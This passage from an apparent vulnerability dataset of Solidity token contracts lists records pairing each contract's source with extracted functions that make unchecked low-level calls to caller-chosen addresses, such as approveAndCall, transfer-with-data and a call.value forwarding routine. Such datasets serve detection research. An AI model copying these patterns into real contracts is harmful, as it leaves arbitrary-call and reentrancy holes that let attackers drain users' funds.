_value);\n require(_value <= allowance[_from][msg.sender]);\n balanceOf[_from] =balanceOf[_from].sub(_value);\n allowance[_from][msg.sender] =allowance[_from][msg.sender].sub(_value);\n totalSupply =totalSupply.sub(_value);\n Burn(_from, _value);\n return true;\n }\n function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n transfer(_to, _value);\n require(_to.call(_data));\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n transferFrom(_from, _to, _value);\n require(_to.call(_data));\n return true;\n }\n function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\n require(_spender != address(this));\n approve(_spender, _value);\n require(_spender.call(_data));\n return true;\n }\n function transferOwnership(address _owner) onlyOwner public {\n owner = _owner;\n }\n function mintToken(address target, uint256 mintedAmount) public onlyOwner {\n balanceOf[target] =balanceOf[target].add(mintedAmount);\n totalSupply =totalSupply.add(mintedAmount);\n Transfer(0, owner, mintedAmount);\n Transfer(owner, target, mintedAmount);\n }\n function freezeAccount(address target, bool freeze) public onlyOwner {\n frozenAccount[target] = freeze;\n FrozenFunds(target, freeze);\n }\n}",
  "extract_feature": [
    "function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\nrequire(_to != address(this));\ntransfer(_to, _value);\nrequire(_to.call(_data));\nreturn true;\n}",
    "function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\nrequire(_to != address(this));\ntransferFrom(_from, _to, _value);\nrequire(_to.call(_data));\nreturn true;\n}",
    "function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\nrequire(_spender != address(this));\napprove(_spender, _value);\nrequire(_spender.call(_data));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb142f"
  },
  "filename": "1395.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token{\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns\n (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns\n (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256\n _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns\n (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success)\n {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(uint256 _initialAmount, string _tokenName, uint8 _decimalUnits, string _tokenSymbol) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1430"
  },
  "filename": "140.sol",
  "content": "pragma solidity ^0.4.18;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract ETCCoin is ERC20 {\n using SafeMath for uint256;\n address owner = msg.sender;\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n string public constant name = \"E.T\";\n string public constant symbol = \"ET\";\n uint public constant decimals = 8;\n uint256 public totalSupply = 333000000e8;\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n event Burn(address indexed burner, uint256 value);\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function ETCCoin () public {\n owner = msg.sender;\n balances[msg.sender] = totalSupply;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n function balanceOf(address _owner) constant public returns (uint256) {\n return balances[_owner];\n }\n modifier onlyPayloadSize(uint size) {\n assert(msg.data.length >= size + 4);\n _;\n }\n function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {\n require(_to != address(0));\n require(_amount <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n balances[_to] = balances[_to].add(_amount);\n Transfer(msg.sender, _to, _amount);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {\n require(_to != address(0));\n require(_amount <= balances[_from]);\n require(_amount <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_amount);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);\n balances[_to] = balances[_to].add(_amount);\n Transfer(_from, _to, _amount);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant public returns (uint256) {\n return allowed[_owner][_spender];\n }\n function withdraw() onlyOwner public {\n uint256 etherBalance = this.balance;\n owner.transfer(etherBalance);\n }\n function burn(uint256 _value) onlyOwner public {\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1431"
  },
  "filename": "1432.sol",
  "content": "pragma solidity ^0.4.18;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract STOCoin is ERC20 {\n using SafeMath for uint256;\n address public owner = msg.sender;\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n string public constant name = \"Singapore Taix organization\";\n string public constant symbol = \"STO\";\n uint public constant decimals = 8;\n uint256 public totalSupply = 100000000e8;\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n event Burn(address indexed burner, uint256 value);\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function STOCoin () public {\n owner = msg.sender;\n balances[msg.sender] = totalSupply;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n function balanceOf(address _owner) constant public returns (uint256) {\n return balances[_owner];\n }\n modifier onlyPayloadSize(uint size) {\n assert(msg.data.length >= size + 4);\n _;\n }\n function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {\n require(_to != address(0));\n require(_amount <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n balances[_to] = balances[_to].add(_amount);\n Transfer(msg.sender, _to, _amount);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {\n require(_to != address(0));\n require(_amount <= balances[_from]);\n require(_amount <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_amount);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);\n balances[_to] = balances[_to].add(_amount);\n Transfer(_from, _to, _amount);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant public returns (uint256) {\n return allowed[_owner][_spender];\n }\n function withdraw() onlyOwner public {\n uint256 etherBalance = this.balance;\n owner.transfer(etherBalance);\n }\n function burn(uint256 _value) onlyOwner public {\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1432"
  },
  "filename": "1458.sol",
  "content": "pragma solidity ^0.4.16;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract FANBASE is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function FANBASE(\n ) {\n balances[msg.sender] = 200000000000000000000000000;\n totalSupply = 200000000000000000000000000;\n name = \"FANABSE EXCHANGE\";\n decimals = 18;\n symbol = \"FNB\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1433"
  },
  "filename": "1468.sol",
  "content": "pragma solidity ^0.4.19;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Elance is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n uint256 public unitsOneEthCanBuy;\n uint256 public totalEthInWei;\n address public fundsWallet;\n function Elance() {\n balances[msg.sender] = 990000000000000;\n totalSupply = 990000000000000;\n name = \"Elance\";\n decimals = 6;\n symbol = \"ELAN\";\n unitsOneEthCanBuy = 2000;\n fundsWallet = msg.sender;\n }\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n if (balances[fundsWallet] < amount) {\n return;\n }\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n Transfer(fundsWallet, msg.sender, amount);\n fundsWallet.transfer(msg.value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1434"
  },
  "filename": "1470.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract OxyCoin is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n uint256 public unitsOneEthCanBuy;\n uint256 public totalEthInWei;\n address public fundsWallet;\n function OxyCoin() {\n balances[msg.sender] = 20000000000000000000000000000;\n totalSupply = 20000000000000000000000000000;\n name = \"OxyCoin\";\n decimals = 18;\n symbol = \"OXY\";\n unitsOneEthCanBuy = 20000000;\n fundsWallet = msg.sender;\n }\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n Transfer(fundsWallet, msg.sender, amount);\n fundsWallet.transfer(msg.value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1435"
  },
  "filename": "1529.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract LOFO is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'L1.0';\n uint256 public unitsOneEthCanBuy;\n uint256 public totalEthInWei;\n address public fundsWallet;\n function LOFO() {\n balances[msg.sender] = 10000000000000000000000000000;\n totalSupply = 10000000000000000000000000000;\n name = \"LOFO\";\n decimals = 18;\n symbol = \"LOFO\";\n unitsOneEthCanBuy = 125000;\n fundsWallet = msg.sender;\n }\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n if (balances[fundsWallet] < amount) {\n return;\n }\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n Transfer(fundsWallet, msg.sender, amount);\n fundsWallet.transfer(msg.value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1436"
  },
  "filename": "160.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success)\n {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(uint256 _initialAmount, string _tokenName, uint8 _decimalUnits, string _tokenSymbol) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1437"
  },
  "filename": "1710.sol",
  "content": "pragma solidity ^0.4.24;\ncontract ERC20 {\n function balanceOf (address owner) public view returns (uint256);\n function allowance (address owner, address spender) public view returns (uint256);\n function transfer (address to, uint256 value) public returns (bool);\n function transferFrom (address from, address to, uint256 value) public returns (bool);\n function approve (address spender, uint256 value) public returns (bool);\n}\ncontract MiddleSaleService {\n address public frontWindow;\n address public salesPipe;\n ERC20 public erc;\n address public owner;\n constructor(address _frontWindow, address _salesPipe, ERC20 _erc) public {\n frontWindow = _frontWindow;\n salesPipe = _salesPipe;\n erc = _erc;\n owner = msg.sender;\n }\n function setFrontWindow (address _frontWindow) external {\n require(msg.sender == owner);\n frontWindow = _frontWindow;\n }\n function setSalesPipe (address _salesPipe) external {\n require(msg.sender == owner);\n salesPipe = _salesPipe;\n }\n function setERC (ERC20 _erc) external {\n require(msg.sender == owner);\n erc = _erc;\n }\n function setOwner (address _owner) external {\n require(msg.sender == owner);\n owner = _owner;\n }\n function buyFST0 (address receiver) internal {\n require(salesPipe.call.value(msg.value)());\n uint256 tmpERCBalance = erc.balanceOf(address(this));\n uint256 tmpEthBalance = address(this).balance;\n if (tmpERCBalance > 0) {\n require(erc.transfer(receiver, tmpERCBalance));\n }\n if (tmpEthBalance > 0) {\n require(receiver.send(tmpEthBalance));\n }\n }\n function buyFST (address receiver) public payable {\n buyFST0(receiver);\n }\n function buyFST () public payable {\n buyFST0(msg.sender);\n }\n function () external payable {\n buyFST0(msg.sender);\n }\n}",
  "extract_feature": [
    "function buyFST0 (address receiver) internal {\nrequire(salesPipe.call.value(msg.value)());\nuint256 tmpERCBalance = erc.balanceOf(address(this));\nuint256 tmpEthBalance = address(this).balance;\nif (tmpERCBalance > 0) {\nrequire(erc.transfer(receiver, tmpERCBalance));\n}\nif (tmpEthBalance > 0) {\nrequire(receiver.send(tmpEthBalance));\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1438"
  },
  "filename": "1729.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public 